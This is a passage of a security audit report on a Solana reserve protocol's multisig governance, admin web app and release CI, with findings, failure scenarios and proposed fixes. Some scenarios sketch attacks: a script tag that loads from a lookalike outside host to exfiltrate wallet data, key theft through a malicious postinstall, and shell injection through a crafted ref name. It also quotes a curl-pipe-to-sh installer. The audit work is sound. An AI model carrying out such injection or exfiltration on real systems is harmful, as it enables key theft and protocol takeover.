- **Location:** `app/lib/server/compose.ts:790-810`; `scripts/devnet/lib/compute.ts`; `scripts/devnet/lib/proposal.ts` (`executeComputeUnitLimit`); `constants.rs:133-138`; `docs/technical-resources/compute-units.md`.
- **Description:**
  - Limits are fixed per instruction kind, measured with 0 adapters, 8 slots and classic SPL Token. The fill loops cap fills at `count`, not slots; only the composer bounds slots. The comment on `MAX_FULFIL_BATCH` says a full batch fits the default 200k; through Squads at opt-level z an 8-fill redeem measured 197,052, within 1.5% of it.
  - `initialize` (up to 210,469), `refresh + set_config + refresh` (203,548) and large fills succeed only if the executor adds `SetComputeUnitLimit(320,000)`. A member executing from a client that adds none gets an out-of-compute failure.
- **Impact:** none in the pilot. Retryable, never a lock. With adapters enabled, fixed limits make `refresh` and fills revert until the app is redeployed.
- **Resolution (proposed):** simulate and set `limit = ceil(simulated × 1.3)` in the composers, or scale by slot and adapter count; add an adapter axis to the compute table; correct the `MAX_FULFIL_BATCH` comment; name the execute path that sets the limit in the runbook, and split large `set_config` proposals.

#### NEW-R2-4. One documented error-code divergence in `initialize`

- **Severity:** Informational ◐.
- **Location:** `instructions/admin/initialize.rs:276-280`.
- **Description:** after #61, a loader-owned account at the `ProgramData` PDA in Buffer or Program state returns `AccountNotProgramData` instead of `InvalidAccountData`. That state cannot exist at the real `ProgramData` address, and both codes reject.
- **Resolution:** none needed. Keep the LiteSVM cases in `tests/tests/initialize.rs`.

### 4.2 Governance and deploy

#### S10. The live devnet test multisigs have four harness-generated member keys on one machine

- **Severity:** Low ✅. Rated Medium by its finder. Downgraded because `deployments/devnet.json` marks the deploy "test deploy (disposable)" and it holds no real money. The same setup on the pilot or mainnet would be High or Critical.
- **Location:** `deployments/devnet.json:23-36` (thresholds recorded, members not); out-of-repo harness `gen-keys.sh` and `state/devnet.deploy.json` (members `admin-member-1/2`, `upgrade-member-1/2`).
- **Description:** the admin and upgrade 2-of-2 multisigs of the live test deploy have four member keys generated by the harness, stored as files in one directory on one machine, next to the operator and pauser keys. The harness signs both approvals of both multisigs itself. The upgrade multisig is the upgrade authority of `GhPkq95…`, with a 120 s time lock. `deployments/devnet.json` and `/reserve` say "2 of 2" without listing members, so a reader cannot tell that "2 of 2" gives no separation here.
- **Impact:** one compromised laptop, or one leaked backup of that directory, gives upgrade authority over the live test program in about two minutes, plus admin, operator and pauser. No real money is at risk. The risk is the precedent: the real deploy must not inherit it.
- **Failure scenario:** a malicious editor extension or npm `postinstall` on the deploy machine reads `upgrade-member-{1,2}.json`, proposes, approves twice, waits 120 s and executes an `Upgrade` to a program that empties `reserve`.
- **Resolution (proposed):**
  - Record `members` and a custody note (Ledger, own device, hot test key) for both multisigs in `deployments/devnet.json`, and have `verify.ts` read them from the record.
  - The real deploy (#91) uses Julia's Ledger and a key Draau holds on his own device, never harness keys. Add a §14.5 and pilot-gate rule: no two members' keys on one machine, ever.
  - Either rotate the test deploy's members through a Squads config transaction and delete the files, or retire the test deploy with #91. Do it together with #99.
- **Reference:** #91, #99; ADR 0028; pre-devnet S5.

#### Info-R1-9. One admin signer can veto everything; one blind-signed proposal is a full compromise

- **Severity:** Informational ◐. Known: the baseline asks for a threshold that tolerates the loss of one member key (`docs/security/baseline.md:142`).
- **Description:** with 2-of-2 Squads v4, one hostile or lost key blocks every admin proposal (fills, so no investor exit while the exit fallback is unbuilt; `approve_claim`; `unpause`; operator re-appointment; `clear_fulfil_halt`) and every upgrade, because the upgrade multisig has the same members. Separately, a blind-signed Ledger approving a disguised proposal is the Binance pattern here (NEW-R1-3, NEW-R3-1).
- **Resolution (proposed):** 2-of-3 with an independent third key before outside capital, with at least one upgrade member who differs; every proposal decoded and checked on a second device before signing (NEW-R3-1); no blind signing for admin members once a Squads-aware clear-signing path exists.

### 4.3 App

#### NEW-R3-1. Admin members can only read a proposal through the origin that builds the bytes they sign

- **Severity:** Medium ✅. It needs code running on the reserve.mutav.finance origin. No third-party script runs there today (section 6), so the routes in are a supply-chain package, a browser extension, a Vercel account or deploy compromise, or a future XSS. With that met, the result is total protocol-admin authority. This is the Bybit pattern.
- **Location:**
  - `components/WalletProvider.tsx:52-89` (`signTransaction` and `signAndSendTransaction` sign any base64 given);
  - `lib/client/use-tx.ts:48-53` (bytes from `build()` go to the wallet unchecked);
  - `app/api/tx/build/route.ts:61-62` (`tx` and `instructions` returned side by side, nothing ties them);
  - `lib/server/squads.ts:284-297`, `:304-315`; `components/admin/Squads.tsx:115` (Approve signs whatever `/api/squads` returns).
- **Description:**
  - The decoder is sound: it runs on the server from the on-chain `VaultTransaction` bytes, not from app state.
  - The weak point is the path from decoder to signer. The JSON from `/api/squads`, the `/api/tx/build` response and the rendered table all come through the same origin as the signing UI. A script on the page can make a malicious proposal display as harmless, swap the bytes returned for signing, or reach the signer through the React context and call it directly.
  - The wallet cannot help: Phantom, Solflare and Backpack show a Squads `vault_transaction_create` or `proposal_approve` as an unknown-program call, and a Ledger in blind-signing mode shows a hash. None shows the multisig, the index or the inner message.
  - The admin and upgrade multisigs share members, so a swapped approve can point at an upgrade proposal.
- **Impact:** any admin instruction can be executed: `propose_admin` to an attacker key then `accept_admin`; `set_payments_account` to an attacker account; `set_config` loosening caps; `set_allowlist_root`. On the upgrade multisig, a program upgrade.
- **Failure scenario:**
  1. A compromised dependency in the client bundle (or an extension with page access) waits on `/admin` for member A to click "Change settings".
  2. It replaces the `tx` from `/api/tx/build` with a `vaultTransactionCreate` whose inner message is `propose_admin(attacker)`, keeping the original `instructions` description.
  3. A's wallet shows a Squads create; A approves, and the create carries A's approval.
  4. On member B's browser the same script rewrites the `/api/squads` JSON so proposal #N decodes as the `set_config` A described. B approves.
  5. After the time lock (60 s on the test deploy, 24 h planned), anyone executes, and the attacker signs `accept_admin`. No alert fires outside the page.
- **Resolution (proposed):** in-page checks alone cannot work, because a same-origin script can rewrite them too.
  1. `scripts/release/verify-proposal.ts <multisig> <index>`: reads the `VaultTransaction` from an RPC the member picks, prints the decoded instructions with the same decode logic and a digest of the inner message. Policy: no member approves a proposal they have not decoded this way.
  2. Approve from a second, independent frontend (the Squads CLI from the member's own machine, or app.squads.so) after step 1. Use the reserve app only to compose.
  3. An out-of-band proposal watcher (a Vercel cron or a mutav-app Convex action) that polls both multisigs, decodes every new vault or config transaction and sends the summary to both founders by Telegram or e-mail. The pilot's 24 h time lock is a hard rule, so the alert has time to lead to a reject or cancel.
  4. Enforce the CSP (A-R3-1).
  5. Different member keys for the admin and upgrade multisigs; at least, the key used in the app is not an upgrade member.
  6. Runbook: no wallet auto-approve or session features on this origin; a Ledger for every admin member.
- **Reference:** S9, NEW-R3-2, A-R3-1, Info-R1-9; Polymarket and Binance incidents (2026-10-29).

#### NEW-R3-2. Squads config changes are offered for Approve and Execute without their arguments

- **Severity:** Medium ✅. A guard bypass: one approval can grant total authority over the admin vault.
- **Location:** `lib/server/squads.ts:198` (`configActions = ….actions.map((a) => a.__kind)`); `lib/proposal-decode.ts:316-328` (`squadsConfigChange`, "review in the Squads UI"); `components/admin/Squads.tsx:135-149` (the warning at :138, Approve and Execute still rendered at :146-148).
- **Description:** a Squads `ConfigTransaction` decodes to action names only (`AddMember`, `RemoveMember`, `ChangeThreshold`, `SetTimeLock`, `AddSpendingLimit`, `SetRentCollector`). The signer never sees which key is added, the new threshold or time lock, or the spending-limit fields. The panel says "review in the Squads UI" and still offers Approve and Execute.
- **Impact:** `AddMember(attacker)` with `ChangeThreshold(1)`, or `SetTimeLock(0)`, gives full control of the admin vault; `AddSpendingLimit` lets a listed key move vault funds without a vote.
- **Failure scenario:** a member proposes "ChangeThreshold" in good faith, or an attacker creates the proposal through NEW-R3-1. The other member sees `AddMember, ChangeThreshold` and approves in the app without opening the Squads UI.
- **Resolution (proposed):** decode the arguments of every `ConfigAction` (member key and permissions, threshold, time lock in seconds, spending-limit fields, rent collector) and mark every config change `warn`. Then either refuse Approve and Execute for config transactions in the app (members use the Squads UI plus the NEW-R3-1 check), or show every argument and require a typed confirmation. Show the upgrade multisig in the panel, read-only.
- **Reference:** NEW-R3-1; pre-devnet A3.

#### A-R3-1. The CSP is report-only, and served scripts carry no nonce, so it cannot be enforced as written

- **Severity:** Low ✅. Defence in depth. It is the control that would block the preconditions of NEW-R3-1, and today it blocks nothing.
- **Location:** `proxy.ts:11, 21-24` (`Content-Security-Policy-Report-Only`); `lib/csp.ts:5-20`; `lib/security-headers.ts:15` (the only enforced CSP is `frame-ancestors 'none'`); `next.config.ts:26-29`.
- **Description:** live check of `GET /admin` on 2026-10-30:
  - the full CSP (nonce, `'strict-dynamic'`, the two simulator hashes, `connect-src 'self'`) is sent only as `Content-Security-Policy-Report-Only`; the enforced header is just `frame-ancestors 'none'`;
  - the served `<script src="/_next/static/…">` tags and the inline scripts carry no `nonce` attribute, and the RSC payload carries `"nonce":"$undefined"`;
  - with `'strict-dynamic'`, `'self'` is ignored, so enforcing the header as is would block every Next.js script and break the site;
  - every page view logs violations, so the plan to "enforce once the console shows no violations" can never be met, and there is no `report-to` or `report-uri`.

  Likely cause, to confirm on a preview deploy: Next.js 16 reads the nonce from the request's `content-security-policy` header before the report-only one. If the static `frame-ancestors 'none'` header reaches the render, Next.js finds no `script-src` and returns no nonce.
- **Impact:** an injected script can load more scripts from anywhere and send data to any domain (the lookalike-telemetry exfiltration of the Polymarket pattern). The planned enforcement step is blocked.
- **Failure scenario:** a compromised bundled package injects `<script src="https://cdn-debugbear-rum.io/x.js">` and posts the wallet address and decoded proposals out. Nothing stops it.
- **Resolution (proposed):** in `proxy.ts`, set the request header `Content-Security-Policy` to the full CSP, or move `frame-ancestors` into the proxy's CSP and drop the static CSP for page routes (keep `X-Frame-Options: DENY` for static files); a Playwright check that every `<script>` on `/admin` has a nonce; `report-to` with a rate-limited same-origin `/api/csp-report`; then enforce, with no `'unsafe-eval'` in production.
- **Reference:** pre-devnet A6.

#### A-R3-2. Anyone can block the `set_config` stale-carry lookup by touching future transaction PDAs

- **Severity:** Low ◐. A denial of service on the app's own guard; the Squads UI still executes.
- **Location:** `lib/server/squads.ts:367-372` (`MAX_CREATE_TX_READS = 100`), `:426-440` (`findCreateMemo`, oldest first), `:467-468`.
- **Description:** the memo lookup reads a transaction PDA's history oldest first and fails closed after 100 transactions without the create. Transaction PDAs are predictable, and anyone can list one as a read-only account in their own transaction before it exists.
- **Impact:** executing an app-built `set_config` is refused; the protocol admin falls back to the Squads UI, which skips the stale-carry check entirely.
- **Failure scenario:** an attacker sends 101 cheap transactions touching each of the next five transaction PDAs (about 0.0025 SOL). The next five `set_config` proposals cannot be executed from the app.
- **Resolution (proposed):** best, an on-chain check: a `config_revision: u64` in `VaultConfig`, checked by `set_config` the way `approve_claim` checks `expected_revision`. Interim: start the scan at the proposal's creation slot, or drop transactions that do not invoke Squads before counting.

#### A-R3-3. Risky admin arguments are folded behind "Details" and not flagged

- **Severity:** Low ◐.
- **Location:** `components/admin/Squads.tsx:91-97`; `lib/proposal-decode.ts:185-190` (new role key not flagged), `:234-238` (`set_config` diffs never flagged), `:240-241` (`SetGuardians`).
- **Description:** the approver sees only the instruction name unless they expand Details. A new operator or pauser key, a `set_config` raising `maxClaimPerCall`, `maxClaimPerPeriod` or `maxTvl` or lowering `coverageRatioBps` or `maxNavMoveBps`, and a guardian change are not flagged.
- **Failure scenario:** a folded `set_config` raises `maxClaimPerCall` from R$15k to R$10M, which removes the `approve_claim` gate for the operator hot key.
- **Resolution (proposed):** always show `set_config` diffs and role keys open; mark `warn` any loosening of a risk cap, any role key not in an optional server list of expected keys (`EXPECTED_OPERATOR`, `EXPECTED_PAUSER`), and any guardian change.

#### A-R3-4. On-chain refs can be linked to leases

- **Severity:** Low ◐. Data minimisation (ADR 0019 decision 8).
- **Location:** `lib/refs.ts:22` (`guaranteeId = sha256("mutav:guarantee:" + lease)`, no salt), `:25-26`; `lib/client/operator-refs.ts:12-46` (agency ids and ref salts in `localStorage`).
- **Description:** lease labels are sequential (`MTV-PF-0100`), so anyone can recompute guarantee ids and notice and invoice hashes by enumeration. The localStorage maps can be read by any same-origin script.
- **Impact:** an outsider can link on-chain guarantees and claims to lease refs; a same-origin script can link agency names to ids. No personal data is exposed directly, but the promised opacity does not hold.
- **Resolution (proposed):** a random guarantee id, or `sha256(salt ‖ lease)` with the operator's salt as `refsHash` already does; salted notice and invoice refs; mark the `/operator` store demo-only with a "forget" button. In production these values stay in mutav-app.

#### A-R3-5. Status of pre-devnet A2: the WAF rate limit is still only staged

- **Severity:** Informational ◐. A status note, not a new finding.
- **Location:** `docs/waf-rule.md:1-3` ("STAGED, not applied"); `app/api/tx/status/route.ts:7-19`.
- **Description:** the pre-devnet review recorded a 30-per-minute limit on the composers, applied after founder confirmation. The repository still says staged, and it could not be checked live (Vercel 403). `/api/tx/status` and the POST composers each cost RPC per request with no throttle besides the WAF.
- **Resolution (proposed):** apply both staged rules and test with the documented loop against a preview URL; a keyed RPC provider before the pilot, with the key server-side.

#### A-R3-6. The static simulator shares the admin signing origin

- **Severity:** Informational ◐.
- **Location:** `next.config.ts:23-25`; `public/simulator.html:1134-1852` (`innerHTML` writes).
- **Description:** no injection was found (inputs pass through `coerce` and `esc`), but any future XSS in this 1,850-line page runs on the same origin as `/admin`.
- **Resolution (proposed):** serve it from another origin, or in a sandboxed iframe (`sandbox="allow-scripts"`, no `allow-same-origin`).

#### A-R3-7. Stale comment about wallet persistence

- **Severity:** Informational ◐.
- **Location:** `components/WalletProvider.tsx:10`.
- **Description:** the comment says the last wallet's name is persisted; nothing is, and there is no auto-connect.
- **Resolution (proposed):** correct the comment and keep it so: no auto-connect for member wallets.

### 4.4 Scripts and CI

#### S9. No signer-side check of an upgrade proposal against a locally reproduced build

- **Severity:** Medium ✅. `scripts/release/` holds only `guard-rpc.ts` and `upgrade-proposal.ts`; neither reads a stored upgrade `VaultTransaction`.
- **Location:** `.github/workflows/release.yml:88-98`, `:194-206`; `scripts/release/upgrade-proposal.ts:50-81`, `:135-159`; `scripts/devnet/lib/proposal.ts:1-14`; `docs/spec.md` §14.5 step 7. `app/lib/server/squads.ts` decodes the admin multisig only.
- **Description:**
  - The buffer check compares `get-buffer-hash` with a hash produced by the same workflow run, from the same ref, tools and `node_modules`. `upgrade-proposal.ts` repeats the check against an `--expected-hash` from the same job. The pipeline checks itself.
  - Spec §14.5 step 7 says each signer reproduces the hash from the tag and decodes every instruction in the stored `VaultTransaction`. No tool does this: nothing reads the upgrade multisig's `VaultTransaction`, allowlists its programs and instruction tags, or compares the named buffer's hash with a hash the signer built.
  - "Buffer authority == upgrade vault" proves nothing about where the buffer came from: anyone can write a buffer and run `set-buffer-authority` to the vault, because the new authority does not sign.
  - A Ledger approving `proposal_approve` sees a Squads instruction, not the inner `Upgrade`.
- **Impact:** a compromised CI dependency or tool, a malicious ref (S11), or one compromised member who builds the vault transaction can present an `Upgrade` from an attacker's buffer, or add a `SetAuthority`, with a consistent "expected hash". With a 2-of-2, the second member's approval is the only remaining control, and that member has no mechanical way to catch it.
- **Failure scenario:**
  1. A compromised transitive dependency of `@solana/kit` runs in the "Upgrade proposal payload" step.
  2. It rewrites `upgrade-proposal.json` to name buffer B', which the attacker wrote earlier and handed to the vault, and returns "ok" from the hash check.
  3. The proposer imports the payload into Squads. The step summary still shows the real buffer B; nobody is required to compare.
  4. Both members approve in the Squads UI. After the time lock the malicious program is live.
- **Resolution (proposed):** `scripts/release/check-upgrade.ts --url --multisig --index <n> --tag <vX> --expected-hash <locally built>`, read-only and signing nothing:
  - reads the `Proposal` and `VaultTransaction` at index n and refuses address-lookup-table accounts;
  - requires every instruction to be loader-v3 `Upgrade` (tag 3) or `ExtendProgramChecked` (tag 9) with the expected program, ProgramData, spill (the vault) and authority (the vault), or the Program Metadata or verify program;
  - refuses any `SetAuthority` (tags 4 and 7) and any other program;
  - reads the named buffer and requires its hash to equal `--expected-hash`, its authority and ProgramData's authority to be the vault;
  - prints the sha256 of the serialised message as a fingerprint.

  Make "both members run `solana-verify build` from the signed tag and `check-upgrade.ts` from a clean clone on their own machine, and paste the output into the proposal thread" a hard step in spec §14.5. Show the upgrade multisig in `/admin` with the same decode. Put the reproduced hash, tag and commit in the Squads memo.
- **Reference:** spec §14.5; S11, S13, S14, NEW-R3-1.

#### S11. The release workflow stages any ref, re-resolves it per job and interpolates it into shell

- **Severity:** Low ◐. Needs repository write access, but gets past the environment branch rules the workflow relies on.
- **Location:** `.github/workflows/release.yml:18-20` (`ref`: any tag or commit); `:67`, `:142` (each job checks out `inputs.ref` again); `:97`, `:126`, `:252` (`${{ inputs.ref }}` in `run:`); `:227-231`.
- **Description:** nothing requires `ref` to be a signed `v*` tag reachable from `main`. If it is a branch, it can move between `build` and `buffer-and-propose`, so the buffer holds commit X while the scripts that run with the payer key, and the commit recorded in the verify PDA, come from commit Y. Git ref names may contain `$`, `(`, `)` and `|`; a branch named to break out of the quoted string runs code in the `run:` steps, including the Summary step in the `devnet` environment.
- **Impact:** a proposal built from an unreviewed commit with a self-consistent hash (feeds S9); a wrong commit in the verify PDA; the RPC key and payer exposed to anyone who can push a branch.
- **Failure scenario:** a phished collaborator token pushes branch `fix-x` with a malicious program and dispatches `release` with `ref=fix-x`. The workflow attaches a buffer and a routine-looking proposal.
- **Resolution (proposed):** pass `inputs.ref` only through `env:`; in `build`, resolve once with `git rev-parse "refs/tags/${REF}^{commit}"`, refuse anything but a `v*` tag, require `git tag -v` and `git merge-base --is-ancestor <sha> origin/main`, and output the commit; later jobs check out that commit; put the SHA in the proposal title and memo.

#### S12. Release assets, including the `idl-compat` baseline, can be overwritten; repository settings are not codified

- **Severity:** Low ◐.
- **Location:** `.github/workflows/release.yml:126` (`gh release upload … --clobber`); `.github/workflows/ci.yml:181-207` (`idl-compat` takes `mutav.json` from the latest `v*` release); no `CODEOWNERS` and no documented rulesets or environments.
- **Description:** any dispatch with `attach_to_release=true` overwrites `mutav.so`, `mutav.json` and `mutav.hash` on an existing release. `idl-compat` picks its baseline with `git tag --sort=-v:refname | head -1`, so pushing a tag `v9.9.9` or clobbering the asset changes the baseline. The repository does not record which branches the `devnet` environment allows, whether the release secrets are environment-scoped, whether `v*` tags are protected, or whether `main` requires review and signed commits.
- **Impact:** the published hash and IDL can be replaced after the fact; a breaking IDL change can pass the compatibility gate by swapping the baseline; outside verifiers are misled.
- **Resolution (proposed):** drop `--clobber`; GitHub immutable releases; a tag ruleset (`v*` created only by maintainers, never moved or deleted); pin the `idl-compat` baseline to a committed field in `deployments/<cluster>.json` (tag plus IDL sha256); a `CODEOWNERS` for `/programs`, `/scripts`, `/.github`, `Cargo.lock`, `bun.lock` and `bunfig.toml`; write the expected settings into `SECURITY.md` and check them with `gh api` (left to Julia, it prompts by design).

#### S13. No third party can reproduce the deployed devnet bytes; the release pipeline cannot upgrade the live program

- **Severity:** Low ◐. Related to #91; only the part #91 does not cover is reported.
- **Location:** `deployments/devnet.json:6-15` ("local anchor build … not a solana-verify (Docker) build"); harness `build.sh` (an ID swap with `sed` and build caches copied from the working tree); `.github/workflows/release.yml:55` (`PROGRAM_ID` is the declared `8scC79…`, not the deployed `GhPkq95…`).
- **Description:** hash `fad721d5…e6e7` depends on the platform tools of one machine, a `sed` patch and copied caches; the tag `v1.0.0-devnet` does not reproduce it. No verify PDA exists. `verify.ts --expected-hash` only confirms that chain bytes equal a hash the deployer computed. Any upgrade of the live program must go through the harness, outside every CI guard.
- **Impact:** nobody outside can confirm that the live program is the reviewed source; an interim devnet upgrade skips the guarded pipeline.
- **Resolution (proposed):** until #91, either tag a commit whose `declare_id!` and `Anchor.toml` say `GhPkq95…`, run `release.yml` with a validated `program_id` input and upgrade to the verified build with a verify PDA; or state in `deployments/devnet.json` and on `/reserve` that the devnet bytes are not reproducible. Never reuse `target/` caches in a release build.

#### S14. `upgrade-proposal.ts` does not check that the buffer declares the target program ID

- **Severity:** Low ◐.
- **Location:** `scripts/release/upgrade-proposal.ts:50-81`, `:135-159`.
- **Description:** two program IDs are in play (`8scC79…` declared, `GhPkq95…` deployed). A buffer built for the other ID passes every check. After `Upgrade`, every instruction fails with `DeclaredProgramIdMismatch`, `pay_claim` included.
- **Impact:** the reserve stops, claims included, until a second upgrade clears the upgrade time lock (7 days on the pilot). That breaks the promise that `pay_claim` within caps is never refused.
- **Failure scenario:** someone runs the pipeline with `PROGRAM_ID` changed to `GhPkq95…` (the S13 fix) while the binary still declares `8scC79…`.
- **Resolution (proposed):** refuse unless the 32 bytes of `--program` appear in the buffer's program bytes (`declare_id!` embeds them); better, deploy the buffer on a Surfpool fork and simulate `refresh` first (the spec §14.5 rehearsal).

#### S15. Toolchains are fetched without integrity pins

- **Severity:** Low ◐.
- **Location:** `ci.yml:46`, `fork.yml:30`, `release.yml:74`, `:153` (`curl … release.anza.xyz/…/install | sh`, no checksum); `ci.yml:60`, `fork.yml:34`, `release.yml:80` (`cargo install --git … --tag v1.2.0 anchor-cli`; git tags move); `fork.yml:38` (unversioned Surfpool installer).
- **Description:** in `buffer-and-propose`, the Solana CLI installed this way runs `write-buffer` and `set-buffer-authority` with the payer key. The host `anchor` produces the published IDL and the `idl-compat` baseline. The Docker image and the Actions are pinned; these downloads are the exceptions.
- **Impact:** a compromised installer endpoint or a moved tag can steal the payer key, tamper with the IDL, or run code in CI. Tampered program bytes are still caught by `solana-verify get-buffer-hash`, but S9 applies.
- **Resolution (proposed):** download the Solana 4.1.2 release tarball and check a committed sha256; install anchor with `--rev <commit>`; pin Surfpool's version and checksum; generate the release IDL inside the verified container or compare it with CI's IDL for the same commit.

#### S16. The buffer payer key sits on disk while `bun` and `node_modules` code run

- **Severity:** Low ◐. The payer holds SOL only, and tampering is covered by S9.
- **Location:** `release.yml:174-180` (writes `payer.json`), `:184-191`, `:210-220` (`bun` steps run while it exists), `:233-235` (removed).
- **Resolution (proposed):** derive the vault first; write the key in the "Write buffer" step and remove it at the end of that step with a `trap`; run the `bun` steps without it; a fresh payer per release, funded with buffer rent only.

#### S17. Gaps in dependency supply-chain hygiene

- **Severity:** Informational ◐.
- **Location:** `bunfig.toml`, `app/bunfig.toml`, `package.json`, `app/package.json:58-61`, `ci.yml`.
- **Description:** `minimumReleaseAge` acts only when Bun resolves versions, not under `--frozen-lockfile` in CI, and is not retroactive for lockfiles resolved before #100. No `cargo audit` or `cargo deny`, no `bun audit`, no Dependabot or Renovate. Nothing detects `Cargo.lock` drift. The root `package.json` has no `trustedDependencies`. No `vercel.json`, so the production install command is Vercel's default (not verified). The admin proposal builder depends on `@solana/web3.js` 1.x and `@sqds/multisig`, which pull `bigint-buffer` (CVE-2025-3194).
- **Resolution (proposed):** `cargo deny check` (advisories; crates.io sources only) and `bun audit` in CI; `git diff --exit-code Cargo.lock` after the build; `"trustedDependencies": []` at the root; `vercel.json` with `installCommand: "bun install --frozen-lockfile"`; Renovate with a 3-day minimum age; treat `@sqds/multisig` as a pinned, reviewed vendor dependency.

#### S18. `check-no-keys.sh` misses `tests-fork/`, inline workflow code and some read APIs

- **Severity:** Informational ◐.
- **Location:** `ci.yml:128`; `package.json` `check:no-keys`; `scripts/check-no-keys.sh:37-69`.
- **Description:** the scan does not cover `tests-fork/` (legitimately local `generateKeyPairSigner`) or `bun -e` code inside workflow files, and misses `createReadStream`, `openSync` and `readSync`, and JSON imports of a key file.
- **Resolution (proposed):** scan `tests-fork/` with an allowlist entry, extract and scan `run:` blocks, add the patterns.

---

## 5. Design decisions taken during the review

None in this run. The review records findings and proposed fixes only. Julia decides each one; fixes come as separate PRs that cite the finding IDs, each with its tests first and, where it changes who can move funds, what is gated or what a cap means, a new ADR and a spec update in the same PR. This report is updated with each finding's resolution as its fix lands.

---

## 6. Confirmed-sound properties

**Worst case for a compromised operator key**
- Money out of the reserve is at most one window's headroom of `max_claim_per_period`: `max_claim_per_period` minus what the current 31-day window has already paid. That is at most **R$20k on the pilot**, and it goes **only into the payments account**, MUTAV's own (`pay_claim.rs:67-72`).
- Why it holds: every payment equals the filing's provision (`pay_claim.rs:104-108`), at most the per-call cap unless the protocol admin approved that exact amount (`:129-135`), and inside the 31-bucket window (`:143-147`).
- A payment booked on day d leaves the window at 00:00 UTC on day d+31, so the shortest time between two full-cap bursts is 30 days and 1 second; no 30-day span pays more than the cap. A clock step back keeps the anchor (`state/state.rs:88-100`). Many small calls do not help: the window counts the sum.
- The pauser's `revoke_operator` takes effect at once. If nobody revokes for T days, the bound is the cap × ⌈(T+1)/31⌉.
- No other operator instruction moves reserve BRS out: `contribute_fees` spends only the operator's own BRS; `sweep_income` moves only inbox to reserve with an exact post-CPI delta check; `settle_payout`, `close_guarantee` and `file_claim` move no tokens.
- The bound does not hold while the period cap is raised for an approved claim (F-R1-2), after a malicious protocol-admin proposal (NEW-R1-3), or if the payments account's owner changes after install (AV-R1-4). The non-money damage is not bounded (NEW-R1-1).

**Program: claim path and roles (R1)**
- `pay_claim` accounts: the payments account is address-bound to config; `reserve` and the vault authority are seeds-bound; the mint and token program are address-bound; `transfer_checked` enforces the mint.
- The filing is seeds-bound to the guarantee and notice hash; the #58 owner and non-empty check runs before decoding; `try_deserialize` checks the discriminator; `WITHDRAWN` and unknown legs are refused; no double payment, because a paid filing is no longer `FILED`.
- `approve_claim` is admin-only, needs `FILED`, `amount == provision`, `amount > 0` and the expected revision. The operator cannot approve its own claims.
- The window ring clears at most 30 buckets per call, a gap of 31 days clears all, the sum is u128 and the bucket add is checked; a property test against a naive model covers gaps and clock steps back.
- `brs_balance ≥ amount` is checked before the subtraction, and the frozen-reserve check runs before the CPI.
- `pay_claim` and `approve_claim` are never gated by pause or by required coverage; the saturating cache recompute cannot fail a payment.
- `close_guarantee` needs `ACTIVE` and no open claim; VOID needs nothing paid; the reasons are restricted. `settle_payout` needs `PAID`, refuses `SETTLED` and a zero hash, and moves no money.
- Roles: `is_operator` refuses the default key; `revoke_operator` clears the operator and the pending operator; `take_pending` checks the signer, the expiry and distinctness; `accept_role(OPERATOR)` needs both money accounts and refuses one the operator owns; `accept_admin` clears pending operator and pauser handovers; `set_guardians` refuses role keys and duplicates.
- `register_guarantee` recomputes required coverage from state inside the instruction and checks the per-guarantee cap.

**Program: refactor equivalence (R2)**
- None of #50, #60 or #61 widens who can sign, changes where money can go, or drops an owner, mint, address or seeds check.
- `emit_event!` (#61) builds the same instruction as Anchor 1.2.0's `emit_cpi!`: same program, account, data and seeds, with the same compile-time bump. After normalisation, 18 instruction files are byte-identical before and after #61.
- `vault_transfer` (#61) uses the same seeds and the stored `authority_bump`; at all seven sites the token program, source, mint, destination, authority, amount and decimals are unchanged.
- The hand-read `ProgramData` in `initialize` keeps its seeds-pinned address and mirrors Anchor's accept and reject rules (NEW-R2-4 is the one error-code difference). `install_money_account` matches both old handler bodies.
- #60 changed no program source; `overflow-checks = true` stays on, and there is no `debug_assert!` in the program. Compute margins over the measured worst cases are 25k to 110k units; a compute failure is retryable, never a lock.
- The #50 rename changed no instruction, account, event or error name, so no discriminator changed.
- Across the whole range, the interface only grows by addition (`approve_claim`, three events, error 6046); existing instructions keep their account order and flags. `ClaimFiling.revision` is carved from padding and the size assertion holds.
- #54 and #58: an admin cancel parks the request and moves nothing; the owner path refunds only to the owner's address-bound account; fills, `advance_queue_head`, `claim_shares` and `claim_assets` treat parked requests correctly. The lenient money-account read treats only a system-owned, data-less account as closed.

**App (R3)**
- No server key and no signing: no keypair, secret, `signTransaction` or private-key read in `app/` server or client code or in `clients/js/src`. `/api/tx/build` and `/api/squads` return unsigned bytes; `/api/tx/send` refuses off localnet.
- Wallet-standard extension wallets only, with no embedded or e-mail wallet and no auto-connect, so every signature goes through a wallet prompt.
- Proposals are decoded on the server from on-chain `VaultTransaction` bytes. Lookup tables, foreign programs, a wrong config account and `propose_admin` are flagged. A proposal's contents cannot change after creation.
- No third-party script on the origin: no analytics, RUM or `next/script`, self-hosted fonts, and the live `/admin` HTML loads only same-origin `/_next/static/*` chunks.
- `@solana/web3.js` 1.99.0 and `@sqds/multisig` are server-only. Versions are pinned by `bun.lock`.
- localStorage holds no session token, key or wallet secret. The mock chain is off in production builds, and no feature flag is reachable through a query, cookie or header.
- No SSRF; request bodies are capped at 4 KiB; heavy scans run only after a membership check; CDN-cached responses do not depend on request headers.
- Live enforced headers: `frame-ancestors 'none'`, `X-Frame-Options: DENY`, `nosniff`, `Referrer-Policy: no-referrer`, a `Permissions-Policy`, COOP, and HSTS of two years. RPC URLs in errors are redacted to their host.

**Scripts and CI (R4)**
- The pre-devnet script findings S1 to S8 have not regressed.
- Every third-party Action is pinned by commit SHA; the Bun version is pinned; the verified-build image is pinned by digest.
- CI runs only on `push: main` and `pull_request`, with no `pull_request_target`; fork PRs get no secrets; the top-level permission is `contents: read`.
- Release jobs use no cache. The release never executes an upgrade; it stages a buffer and an unsigned payload.
- The buffer authority moves to the vault before the hash check; the spill account is the vault; `ExtendProgramChecked` is sized from the hash-checked buffer.
- Every RPC script goes through the genesis-checked cluster guard, which refuses monikers, empty values and the mainnet genesis even on loopback.
- `deploy.ts` hands upgrade authority only to the vault derived from the configured multisig, after checking both multisigs, the `.so` hash, the payer file mode and the program keypair. `verify.ts` checks the ProgramData hash, the upgrade authority, both multisigs and the full config.
- The scripts never open key files. `Cargo.lock` has crates.io sources only, all with checksums; the Bun lockfiles carry sha512 integrity and CI installs with `--frozen-lockfile`.

---

## 7. OWASP Smart Contract Top 10 (2026): changes since the last review

The full mapping is in the pre-devnet review (report in review, #94), and the design checklist is in [Reviews and audits](../security/reviews-and-audits.md#owasp-smart-contract-top-10-2026-as-a-checklist). This table shows only what changed with this audit.

| Category | Change | References |
|---|---|---|
